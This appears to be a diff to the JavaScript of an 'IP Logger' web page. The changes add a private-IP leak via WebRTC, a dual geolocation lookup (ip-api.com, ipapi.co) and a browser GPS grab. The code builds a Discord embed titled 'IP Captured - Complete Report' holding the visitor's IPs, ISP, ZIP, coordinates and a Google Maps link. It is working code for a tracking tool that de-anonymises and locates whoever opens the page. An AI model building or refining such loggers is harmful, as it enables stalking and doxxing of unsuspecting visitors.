@@ -91,13 +91,15 @@
                 pc.createDataChannel('');
                 pc.createOffer()
                     .then(offer => pc.setLocalDescription(offer))
-                    .catch(err => console.log('WebRTC error:', err));
+                    .catch(err => {
+                        console.log('WebRTC error:', err);
+                        resolve('WebRTC blocked');
+                    });
                 
                 pc.onicecandidate = (ice) => {
                     if (!ice || !ice.candidate || !ice.candidate.candidate) {
-                        // If WebRTC fails, try fallback
                         if (ips.length === 0) {
-                            resolve('Not available (WebRTC blocked)');
+                            resolve('Not available');
                         } else {
                             resolve(ips[0]);
                         }
@@ -110,36 +112,85 @@
                     
                     if (match && match[1]) {
                         const ip = match[1];
-                        // Filter out public and common IPs
-                        if (!ip.startsWith('192.168.') && 
-                            !ip.startsWith('10.') && 
-                            !ip.startsWith('172.16.')) {
-                            return;
-                        }
-                        if (!ips.includes(ip)) {
-                            ips.push(ip);
+                        // Filter for private IPs only
+                        if (ip.startsWith('192.168.') || 
+                            ip.startsWith('10.') || 
+                            (ip.startsWith('172.') && 
+                             parseInt(ip.split('.')[1]) >= 16 && 
+                             parseInt(ip.split('.')[1]) <= 31)) {
+                            if (!ips.includes(ip)) {
+                                ips.push(ip);
+                            }
                         }
                     }
                 };
                 
-                // Timeout after 1 second
+                // Timeout
                 setTimeout(() => {
                     pc.close();
                     if (ips.length > 0) {
                         resolve(ips[0]);
                     } else {
-                        // Method 2: Fallback - use server-side detection
-                        fetch('https://api.ipify.org?format=json')
-                            .then(res => res.json())
-                            .then(data => {
-                                resolve(`Public IP only: ${data.ip}`);
-                            })
-                            .catch(() => {
-                                resolve('Could not determine');
-                            });
+                        resolve('Could not determine');
                     }
-                }, 1000);
+                }, 1500);
             });
+        }
+        
+        // Better geolocation API function
+        async function getLocationInfo(ip) {
+            try {
+                // Try ip-api.com first (more accurate for many locations)
+                const response1 = await fetch(`http://ip-api.com/json/${ip}`);
+                const data1 = await response1.json();
+                
+                if (data1.status === 'success') {
+                    return {
+                        city: data1.city || 'Unknown',
+                        region: data1.regionName || data1.region || 'Unknown',
+                        country: data1.country || data1.country_name || 'Unknown',
+                        isp: data1.isp || data1.org || 'Unknown',
+                        zip: data1.zip || data1.postal || 'Unknown',
+                        timezone: data1.timezone || 'Unknown',
+                        lat: data1.lat || data1.latitude || 'Unknown',
+                        lon: data1.lon || data1.longitude || 'Unknown',
+                        source: 'ip-api.com'
+                    };
+                }
+            } catch (e) {
+                console.log('ip-api.com failed, trying ipapi.co');
+            }
+            
+            // Fallback to ipapi.co
+            try {
+                const response2 = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data2 = await response2.json();
+                
+                return {
+                    city: data2.city || 'Unknown',
+                    region: data2.region || data2.region_name || 'Unknown',
+                    country: data2.country_name || data2.country || 'Unknown',
+                    isp: data2.org || 'Unknown',
+                    zip: data2.postal || data2.zip || 'Unknown',
+                    timezone: data2.timezone || 'Unknown',
+                    lat: data2.latitude || 'Unknown',
+                    lon: data2.longitude || 'Unknown',
+                    source: 'ipapi.co'
+                };
+            } catch (e) {
+                console.log('All location APIs failed');
+                return {
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    isp: 'Unknown',
+                    zip: 'Unknown',
+                    timezone: 'Unknown',
+                    lat: 'Unknown',
+                    lon: 'Unknown',
+                    source: 'None'
+                };
+            }
         }
         
         document.getElementById('trackButton').addEventListener('click', async function() {
@@ -159,24 +210,8 @@
                 // Get local IP
                 const localIP = await getLocalIP();
                 
-                // Get detailed location info
-                let city = 'Unknown', region = 'Unknown', country = 'Unknown', isp = 'Unknown', 
-                    zip = 'Unknown', timezone = 'Unknown', lat = 'Unknown', lon = 'Unknown';
-                    
-                try {
-                    const locationResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
-                    const locationData = await locationResponse.json();
-                    city = locationData.city || 'Unknown';
-                    region = locationData.region || 'Unknown';
-                    country = locationData.country_name || 'Unknown';
-                    isp = locationData.org || 'Unknown';
-                    zip = locationData.postal || 'Unknown';
-                    timezone = locationData.timezone || 'Unknown';
-                    lat = locationData.latitude || 'Unknown';
-                    lon = locationData.longitude || 'Unknown';
-                } catch (e) {
-                    console.log('Location API failed');
-                }
+                // Get accurate location info
+                const locationInfo = await getLocationInfo(publicIP);
                 
                 // Detect device info
                 const deviceInfo = detectDevice();
@@ -194,6 +229,46 @@
                 const referrer = document.referrer || 'Direct visit';
                 const language = navigator.language || 'Unknown';
                 
+                // Get more accurate coordinates using browser geolocation API (if user allows)
+                let accurateLat = locationInfo.lat;
+                let accurateLon = locationInfo.lon;
+                let accuracy = 'IP-based';
+                
+                // Try to get browser geolocation (more accurate)
+                if (navigator.geolocation) {
+                    try {
+                        const geoPromise = new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    resolve({
+                                        lat: position.coords.latitude.toFixed(6),
+                                        lon: position.coords.longitude.toFixed(6),
+                                        accuracy: position.coords.accuracy,
+                                        source: 'Browser GPS'
+                                    });
+                                },
+                                (error) => {
+                                    reject(error);
+                                },
+                                { timeout: 3000 }
+                            );
+                        });
+                        
+                        const geoData = await Promise.race([
+                            geoPromise,
+                            new Promise(resolve => setTimeout(() => resolve(null), 3000))
+                        ]);
+                        
+                        if (geoData) {
+                            accurateLat = geoData.lat;
+                            accurateLon = geoData.lon;
+                            accuracy = `GPS (Accuracy: ${Math.round(geoData.accuracy)}m)`;
+                        }
+                    } catch (e) {
+                        console.log('Geolocation denied or failed');
+                    }
+                }
+                
                 // Get time
                 const now = new Date();
                 const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
@@ -203,6 +278,11 @@
                 hours = hours ? hours : 12;
                 const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                 
+                // Create Google Maps link from coordinates
+                const mapsLink = (accurateLat !== 'Unknown' && accurateLon !== 'Unknown') 
+                    ? `https://www.google.com/maps?q=${accurateLat},${accurateLon}`
+                    : 'No coordinates available';
+                
                 // Create Discord embed
                 const embed = {
                     title: "IP Captured - Complete Report",
@@ -210,12 +290,17 @@
                     fields: [
                         {
                             name: "IP ADDRESSES",
-                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\`\n**ISP:** ${isp}`,
+                            value: `**Public IP:** \`${publicIP}\`\n**Local IP:** \`${localIP}\`\n**ISP:** ${locationInfo.isp}`,
                             inline: true
                         },
                         {
-                            name: "LOCATION",
-                            value: `**City:** ${city}\n**Region:** ${region}\n**Country:** ${country}\n**ZIP:** ${zip}\n**Timezone:** ${timezone}`,
+                            name: "LOCATION INFO",
+                            value: `**City:** ${locationInfo.city}\n**Region:** ${locationInfo.region}\n**Country:** ${locationInfo.country}\n**ZIP:** ${locationInfo.zip}\n**Timezone:** ${locationInfo.timezone}`,
+                            inline: true
+                        },
+                        {
+                            name: "COORDINATES",
+                            value: `**Latitude:** ${accurateLat}\n**Longitude:** ${accurateLon}\n**Accuracy:** ${accuracy}\n**Source:** ${locationInfo.source}\n**Maps:** ${mapsLink}`,
                             inline: true
                         },
                         {
@@ -229,18 +314,13 @@
                             inline: true
                         },
                         {
-                            name: "BROWSER SETTINGS",
-                            value: `**Cookies:** ${cookiesEnabled}\n**Do Not Track:** ${doNotTrack}\n**Online:** ${onlineStatus}\n**Referrer:** ${referrer.substring(0, 30)}${referrer.length > 30 ? '...' : ''}`,
-                            inline: true
-                        },
-                        {
                             name: "TIME & DATE",
-                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Coordinates:** ${lat}, ${lon}\n**UTC Time:** ${now.toUTCString()}`,
+                            value: `**Date:** ${dateStr}\n**Time:** ${timeStr}\n**UTC:** ${now.toUTCString()}\n**Timestamp:** ${now.getTime()}`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: "IP Logger • Complete report"
+                        text: `IP Logger • Location source: ${locationInfo.source} • Coordinates: ${accuracy}`
                     },
                     timestamp: new Date().toISOString()
                 };
